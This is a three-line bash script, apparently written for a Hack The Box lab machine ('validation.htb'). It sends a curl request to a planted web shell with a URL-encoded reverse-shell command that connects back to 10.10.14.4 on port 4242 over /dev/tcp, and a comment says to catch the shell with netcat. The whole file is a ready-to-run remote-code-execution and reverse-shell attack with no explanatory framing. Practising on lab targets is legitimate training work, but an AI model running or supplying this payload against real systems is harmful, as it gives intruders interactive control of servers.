#!/bin/bash

curl http://validation.htb/shell.php\?cmd\=bash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.14.4%2F4242+0%3E%261%27 &
#catch w/ nc -lvnp 4242
